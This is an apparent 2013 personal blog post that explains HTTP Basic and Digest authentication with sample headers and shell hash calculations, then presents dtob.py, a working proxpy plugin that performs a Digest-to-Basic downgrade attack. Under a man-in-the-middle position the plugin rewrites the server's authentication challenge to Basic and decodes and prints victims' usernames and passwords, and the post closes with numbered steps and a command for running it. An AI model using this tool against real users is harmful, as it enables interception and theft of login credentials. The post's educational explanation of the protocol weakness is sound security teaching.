
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack - #!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="Introduction Lets start by saying that I am by no means an expert at any of what I am about to write. Primarily this post is purely for research &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io/blog/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-25T18:52:00+02:00" pubdate data-updated="true">Jun 25<sup>th</sup>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><h3>Introduction</h3>

<p>Lets start by saying that I am by <em>no</em> means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those <em>something to do</em> scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)</p>

<!--more-->


<h3>Authentication at a HTTP Level</h3>

<p>HTTP Level authentication, for the most part, rely on a set of headers to authenticate the user. Generally speaking, the server will present the expected authentication mechanism via a <code>WWW-Authenticate</code> header, and expect the client to prepare the correct response back. Each request the user makes after a successful authentication attempt, has to contain the correct headers for the applicable authentication scheme, else the server would normally respond with a <code>401 - Not Authorised</code>, and the client has to re-authenticate. It is up to the server/application to validate the headers on each request.
HTTP level authentication mechanisms include <a href="http://tools.ietf.org/html/rfc2617#section-2">Basic</a>, <a href="http://tools.ietf.org/html/rfc2617#section-3">Digest</a> as well as more complex schemes such as <a href="http://tools.ietf.org/html/rfc4559">Kerberos</a>, <a href="http://davenport.sourceforge.net/ntlm.html#ntlmHttpAuthentication">NTLM</a> and <a href="http://oauth.net/core/1.0/#auth_header">OAuth</a></p>

<p>It is important to note that even though you are using say, Digest authentication, it is entirely up to the backend systems to <strong>validate</strong> the credentials. Whether it is some backend database, RADIUS server, LDAP etc. that stores your valid set of credentials does not matter. The server and the client, on a HTTP level, will be exchanging these headers.</p>

<p>For the purpose of this article, I will focus a little on the arguably less complex mechanisms, Basic and Digest.</p>

<h3>HTTP Basic Authentication</h3>

<p>Basic authentication is considered the <em>least secure</em> method of HTTP authentication. Why is this exactly? Well, the credentials used to authenticate you as a user is sent over the wire in a Base64 encoded string. Base64 is a <strong>encoding</strong> scheme, and <strong>not</strong> an encryption scheme [<a href="http://en.wikipedia.org/wiki/Base64">1</a>].</p>

<p>To demonstrate this, lets assume we have a website that wants to make use of basic authentication. A sample request header would look like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /auth/basic/ HTTP/1.1
</span><span class='line'>Host: test.dev
</span><span class='line'>Proxy-Connection: keep-alive
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
</span><span class='line'>DNT: 1
</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
</span><span class='line'>Accept-Language: en-US,en;q=0.8,af;q=0.6</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The website, configured to use basic authentication, will see that there is no <code>Authorisation</code> header presented by the client, and respond with a <code>401</code>, as well as a <code>WWW-Authenticate</code> header.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HTTP/1.0 401 Unauthorised
</span><span class='line'>Date: Tue, 25 Jun 2013 17:33:37 GMT
</span><span class='line'>Server: Apache/2.2.22 (Unix) DAV/2 PHP/5.3.15 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8x
</span><span class='line'>X-Powered-By: PHP/5.3.15
</span><span class='line'>WWW-Authenticate: Basic realm="Basic Auth Testing"
</span><span class='line'>Content-Length: 39
</span><span class='line'>Connection: close
</span><span class='line'>Content-Type: text/html
</span><span class='line'>
</span><span class='line'>Text to send if user hits Cancel button</span></code></pre></td></tr></table></div></figure>


<p>The response we got when attempting to access the website told us that we need to provide a authentication response first. Based on the <code>WWW-Authenticate</code> header, this mechanism should be <code>Basic</code> for the realm <em>Basic Auth Testing</em>. Don&rsquo;t stress too much about the realm part. In short, this is usually used to give the user a short message like &ldquo;Restricted Area&rdquo; etc.
In the authentication dialog that the browser presents, we provide some credentials, and submit them for processing. Your browser now goes and prepares the <code>Authorisation</code> header.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /auth/basic/ HTTP/1.1
</span><span class='line'>Host: test.dev
</span><span class='line'>Proxy-Connection: keep-alive
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
</span><span class='line'>DNT: 1
</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
</span><span class='line'>Accept-Language: en-US,en;q=0.8,af;q=0.6</span></code></pre></td></tr></table></div></figure>


<p>Because my credentials are correct, the server will respond now with a <code>200</code> and serve the content. But, lets take a quick step back and check out what is actually in this header. More specifically, check out the <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code> part.
This header now needs to be present in every request that is made to the website. If for whatever reason the credentials are no longer valid, the server/application will usually respond with a <code>401</code> again, and the authentication will re-occur. The user normally does not have to do anything, as the browser will automatically include the Authorization header in every request.</p>

<h4>Ok, so what?</h4>

<p>So lets take a moment and relook at the <code>Authorisation</code> header. <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>
Lets strip the <em>Authorisation: Basic</em> section and just work with the <code>dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>. We will echo this, and pipe it through a base64 decoder in a shell session:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk&quot;</span> <span class="p">|</span> base64 -d
</span><span class='line'>user.name:s3cr3tP@ssw0rd
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yup, thats it&hellip;</p>

<p>It is now clear to see that for HTTP Basic authentication, the browser will take the credentials that the user has provided, and create the header in the format:
<code>Authorisation: Basic</code> + <strong>base64(username:password)</strong>. If you are protecting a non-SSL web resource with this authentication mechanism, you are essentially asking your users to send their credentials unencrypted over the wire to you for every requset.</p>

<h3>HTTP Digest Authentication</h3>

<p>Digest authentication is considered to be <em>more</em> secure, as it actually applies a hash function to the credentials, before passing the header on to the server. For the sake of brevity, lets assume the server will act in a similar fashion to the Basic Authentication example above, except, the <code>WWW-Authenticate</code> and <code>Authorisation</code> headers are completely different. You are of course welcome to check it out yourself, and I would encourage you do so!</p>

<p>Lets look at an example, and then dig into the details. Requesting a digest protected web resource @<em>/login</em> without a valid <code>Authorisation</code> header, will cause our sample application to respond with a <code>401</code> and a <code>WWW-Authenticate</code> header as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>WWW-Authenticate: Digest <span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;test.dev&quot;</span>,qop<span class="o">=</span><span class="s2">&quot;auth&quot;</span>,nonce<span class="o">=</span><span class="s2">&quot;064af982c5b571cea6450d8eda91c20d&quot;</span>,opaque<span class="o">=</span><span class="s2">&quot;d8ea7aa61a1693024c4cc3a516f49b3c&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just as the Basic example, the browser will prompt the user for credentials now and prepare the response. The response then to the server would include the following <code>Authorisation</code> header:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Authorisation: Digest <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;user.name&quot;</span>, <span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;test.dev&quot;</span>, <span class="nv">nonce</span><span class="o">=</span><span class="s2">&quot;064af982c5b571cea6450d8eda91c20d&quot;</span>, <span class="nv">uri</span><span class="o">=</span><span class="s2">&quot;/login&quot;</span>, <span class="nv">response</span><span class="o">=</span><span class="s2">&quot;70eda34f1683041fd9ab72056c51b740&quot;</span>, <span class="nv">opaque</span><span class="o">=</span><span class="s2">&quot;d8ea7aa61a1693024c4cc3a516f49b3c&quot;</span>, <span class="nv">qop</span><span class="o">=</span>auth, <span class="nv">nc</span><span class="o">=</span>00000001, <span class="nv">cnonce</span><span class="o">=</span><span class="s2">&quot;61417766e50cb980&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Clearly the response here is much more complex when compared to the Basic example. So, lets refer to the Wikipedia Article <a href="http://en.wikipedia.org/wiki/Digest_access_authentication#Overview">here</a>, or the official RFC <a href="http://tools.ietf.org/html/rfc2069#section-2.1.2">here</a> to help us understand what is going on here.</p>

<p>According to the Wikipedia article, the response <code>Authorisation</code> header for Digest authentication for <a href="http://tools.ietf.org/html/rfc2617#section-3.2.2">RFC 2617</a> is calculated as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># If the algorithm directive in the WWW-Authenticate header is &#39;MD5&#39; or unspecified</span>
</span><span class='line'><span class="nv">ha1</span> <span class="o">=</span> md5<span class="o">(</span>username : realm : password<span class="o">)</span>
</span><span class='line'><span class="c"># Else, if the algorithm directive is &#39;MD5-Sess&#39;, the nonce and client nonce becomes part of ha1</span>
</span><span class='line'><span class="nv">ha1</span> <span class="o">=</span> md5<span class="o">(</span>md5<span class="o">(</span>username : realm : password<span class="o">)</span> : nonce : cnonce<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># For ha2, if the qop directive is &#39;auth&#39; or unspecified</span>
</span><span class='line'><span class="nv">ha2</span> <span class="o">=</span> md5<span class="o">(</span>method : digestURI<span class="o">)</span>
</span><span class='line'><span class="c"># Else, if the qop directive is &#39;auth-int&#39;</span>
</span><span class='line'><span class="c"># Where entity body is the actual response HTML from the doctype down to the last &lt;/html&gt;. See: http://www.w3.org/Protocols/rfc2616/rfc2616-sec7.html#sec7  </span>
</span><span class='line'><span class="nv">ha2</span> <span class="o">=</span> md5<span class="o">(</span>method : digestURI : md5<span class="o">(</span>entityBody<span class="o">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Lastly, for the response, if the qop directive is &#39;auth&#39; or &#39;auth-int&#39;</span>
</span><span class='line'><span class="nv">response</span> <span class="o">=</span> md5<span class="o">(</span>ha1 : nonce : nonceCount : clientNonce : qop : ha2<span class="o">)</span>
</span><span class='line'><span class="c"># Else, if qop is unspecified </span>
</span><span class='line'><span class="nv">response</span> <span class="o">=</span> md5<span class="o">(</span>ha1 : nonce : ha2<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, lets take this formula, step by step and try and replicate the response <code>Authorisation</code> header in a shell. If one of the <code>WWW-Authenticate</code> headers don&rsquo;t make sense then I&rsquo;ll highly reccomend you read the RFC.</p>

<figure class='code'><figcaption><span>Example of Calculating a Digest Authentication Response header in a shell with a qop of &#8220;auth&#8221;</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Assign some values to variables. These values will come from the above headers</span>
</span><span class='line'><span class="nv">qop</span><span class="o">=</span><span class="s2">&quot;auth&quot;</span>
</span><span class='line'><span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;test.dev&quot;</span>
</span><span class='line'><span class="nv">nonce</span><span class="o">=</span><span class="s2">&quot;064af982c5b571cea6450d8eda91c20d&quot;</span>
</span><span class='line'><span class="nv">uri</span><span class="o">=</span><span class="s2">&quot;/login&quot;</span>
</span><span class='line'><span class="nv">cnonce</span><span class="o">=</span><span class="s2">&quot;61417766e50cb980&quot;</span>
</span><span class='line'><span class="nv">nc</span><span class="o">=</span><span class="s2">&quot;00000001&quot;</span>
</span><span class='line'><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;user.name&quot;</span> <span class="c"># This is what the user enters</span>
</span><span class='line'><span class="nv">password</span><span class="o">=</span><span class="s2">&quot;s3cr3tP@ssw0rd&quot;</span> <span class="c"># This is what the user enters</span>
</span><span class='line'><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;GET&quot;</span>
</span><span class='line'><span class="c"># Start off with calculating ha1.</span>
</span><span class='line'><span class="c"># We do not have the algorithm directive specified, so ha1 is calculated as:</span>
</span><span class='line'><span class="nv">$ ha1</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> -n <span class="nv">$username</span><span class="s2">&quot;:&quot;</span><span class="nv">$realm</span><span class="s2">&quot;:&quot;</span><span class="nv">$password</span> <span class="p">|</span> md5<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Confirm  that the value is set.</span>
</span><span class='line'><span class="nv">$ </span>print <span class="nv">$ha1</span>
</span><span class='line'>d5d7ef83a9b3ad5bb0b5201b2bace033
</span><span class='line'>
</span><span class='line'><span class="c"># Next calculate the value of ha2.</span>
</span><span class='line'><span class="c"># Our application presented the qop directive as &#39;auth&#39;, so ha2 is calculated as:</span>
</span><span class='line'><span class="nv">$ ha2</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> -n <span class="nv">$method</span><span class="s2">&quot;:&quot;</span><span class="nv">$uri</span> <span class="p">|</span> md5<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Again, confirm that its set.</span>
</span><span class='line'><span class="nv">$ </span>print <span class="nv">$ha2</span>
</span><span class='line'>315c3fb2f18fd4c6e5a3175e489464ad
</span><span class='line'>
</span><span class='line'><span class="c"># With both &#39;ha1&#39; and &#39;ha2&#39; set, we can calculate the response</span>
</span><span class='line'><span class="c"># We have the qop directive specified, so our response is calculated as:</span>
</span><span class='line'><span class="nv">$ response</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> -n <span class="nv">$ha1</span><span class="s2">&quot;:&quot;</span><span class="nv">$nonce</span><span class="s2">&quot;:&quot;</span><span class="nv">$nc</span><span class="s2">&quot;:&quot;</span><span class="nv">$cnonce</span><span class="s2">&quot;:&quot;</span><span class="nv">$qop</span><span class="s2">&quot;:&quot;</span><span class="nv">$ha2</span> <span class="p">|</span> md5<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="c"># And did we get the right response?</span>
</span><span class='line'><span class="nv">$ </span>print <span class="nv">$response</span>
</span><span class='line'>70eda34f1683041fd9ab72056c51b740
</span></code></pre></td></tr></table></div></figure>


<p><code>70eda34f1683041fd9ab72056c51b740</code> is the valid <code>response</code> header for this request. Note that the next client request will set <code>nc=00000002</code> and therefore the response will be different due to this value being part of the response calculation. However, the fact remains that the authorisation is continuously done via header exchanges between the client and the server, relying on the server to validate them.</p>

<p>It is also clear that this can not be easily reversed. Even though some attributes that make up the hash function are known, the username and password are at least hashed and factored into the response attribute. It is not impossible, though not as easy as Basic authentication.</p>

<h3>O..K.. so I now get how the Basic vs Digest stuff works, whats next?</h3>

<p>What if we could make the browser think that the server wants basic authentication, and then capture the encdoded credentials? That would mean we dont need any l33t cracking skeelz or anything. Just a <code>base64 -d</code>.</p>

<h3>Downgrade all the auth!</h3>

<p>Assuming you are able to get some form of MiTM between the client and the server, by whichever means you use, we can intercept the headers and change them to tell the browser that we actually want basic authentication. Remember, the browser responds based on what the server asks, so if the server only asks for Basic authentication&hellip; :D</p>

<p>&ldquo;Downgrade&rdquo; attacks are a known flaw in Digest authentication. Where Digest authentication is not necessarily vulnerable to MiTM attacks in the sense that the hash still needs to be cracked, Basic authentication is and therefore such an attack can prove to be valuable to an attacker.</p>

<h3>Enough talk, PoC!</h3>

<p>Using <a href="https://code.google.com/p/proxpy/">proxpy</a>, which is a pluggable python proxy server, I wrote a PoC demoing this exact attack. There are a lot of scenarios where this doesn&rsquo;t work very well, but this is only meant to demonstrate the problem.</p>

<h4>The plugin</h4>

<figure class='code'><figcaption><span>dtob.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># dtob.py</span>
</span><span class='line'><span class="c"># Digest to Basic downgrade attack PoC plugin for proxpy (https://code.google.com/p/proxpy/)</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># 2013 Leon Jacobs</span>
</span><span class='line'><span class="c"># Licensed under IDC (I don&#39;t Care) license.</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">hashlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">headerCleanup</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># strip annoying bracket things</span>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">&quot;&#39;[</span><span class="se">\\</span><span class="s">&#39;&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">&#39;]&#39;&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># convert it to a list</span>
</span><span class='line'>    <span class="n">headers</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;, &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">headers</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">proxy_mangle_request</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">getHeader</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">headers</span> <span class="o">=</span> <span class="n">headerCleanup</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Basic&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[*] Basic Auth Response Detected.&quot;</span>
</span><span class='line'>        <span class="n">credentials</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot; &quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">credentials</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">credentials</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] Found username &#39;</span><span class="si">%s</span><span class="s">&#39; and password &#39;</span><span class="si">%s</span><span class="s">&#39; for URL </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">credentials</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">credentials</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">str</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">url</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Digest&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[x] Aww, the client responded with a Digest. </span><span class="se">\&quot;</span><span class="s">Were too late!</span><span class="se">\&quot;</span><span class="s"> :(&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">req</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">proxy_mangle_response</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">getHeader</span><span class="p">(</span><span class="s">&quot;WWW-Authenticate&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">headers</span> <span class="o">=</span> <span class="n">headerCleanup</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Digest&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Swap out Digest for Basic :&gt;</span>
</span><span class='line'>        <span class="n">header</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[*] Found digest auth. Masquerading the response with a basic one :&gt;&quot;</span>
</span><span class='line'>        <span class="n">res</span><span class="o">.</span><span class="n">setHeader</span><span class="p">(</span><span class="s">&quot;WWW-Authenticate&quot;</span><span class="p">,</span> <span class="s">&quot;Basic realm=pwnd&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">res</span>
</span></code></pre></td></tr></table></div></figure>


<p>Lets get to it.</p>

<ol>
<li><p>At the core, this authentication downgrade attack PoC leverages off the ability to perform a MiTM between the client and server. How you get this MiTM is out of the scope of this article, but bear in mind that MiTM is not <strong>just</strong> arp spoofing clients. You could NAT web traffic to your proxy too&hellip; :)</p></li>
<li><p>Download <a href="https://code.google.com/p/proxpy/">proxpy</a> and extract it to a working directory.</p></li>
<li><p>Download and save the plugin from <a href="https://gist.github.com/th3l33k/5868963/raw/8b20c879ad68cd46fd470b86f9bdc7f33da4b097/dtob.py">here</a> into the <code>plugins/</code> directory in your proxpy working directory.</p></li>
<li><p>Start the proxy, specifying the port you&rsquo;d like it to run on, as well as telling it to load the plugin.
A sample command to get this running would be: <code>python proxpy.py -p 8090 -x plugins/dtob.py</code></p></li>
<li><p>Ensure that your MiTM is successful, and watch as digest authentication gets downgraded to basic auth, and your credentials echoed to the terminal :P Something like this&hellip;</p></li>
</ol>


